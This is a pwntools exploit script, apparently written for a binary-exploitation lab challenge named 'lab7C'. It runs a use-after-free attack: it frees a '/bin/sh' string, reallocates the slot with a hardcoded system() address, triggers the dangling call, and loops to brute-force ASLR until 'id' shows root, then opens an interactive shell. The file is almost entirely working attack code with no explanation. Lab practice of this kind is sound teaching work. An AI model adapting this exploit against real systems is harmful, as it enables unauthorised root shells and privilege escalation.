#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386', kernel='amd64')
context.log_level = "DEBUG"
exe = './lab7C'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set follow-fork-mode child
break *main+752
break *main+757
break *main+810
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

system = p32(0xf7e0d9e0)


io = start()

#Bruteforce ASLR
while True:
    try:
        io.recv()

#Allocate String
        #io.interactive()
        io.sendline("1")
        #io.sendline(fit({0:"/bin/sh"},length=20))
        io.sendline("/bin/sh")
        #io.sendline("")
        io.recv()
        #io.recv()

#Free string
        io.sendline("3")
        io.recv()

#Allocate integer
        io.sendline("2")
        io.recv()
        #gdb.attach(io)
        io.sendline(str(int(0xf7e0d9e0)))
        io.recv()

#Invoke UAF
        #gdb.attach(io, gdbscript=gdbscript)
        io.sendline("5")
        io.recv()
        #gdb.attach(io, gdbscript=gdbscript)
        io.sendline("1")
        recv = io.recv(timeout=2)
        #io.interactive()
        #recv = io.recv()
        a = [b"stack smashing detected", b"Fatal error:"]
        if any(x in recv for x in a ):
            raise EOFError
        
        if not io.connected():
            raise EOFError
        
        io.sendline("id")
        recv = io.recv(timeout=2)
        time.sleep(5)
        if b"root" not in recv:
            raise EOFError

            #gdb.attach(io,gdbscript=gdbscript)
        io.interactive()
    except EOFError:
        io.kill()
        io = start()
    except:
        io.kill()
        io = start()





# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)


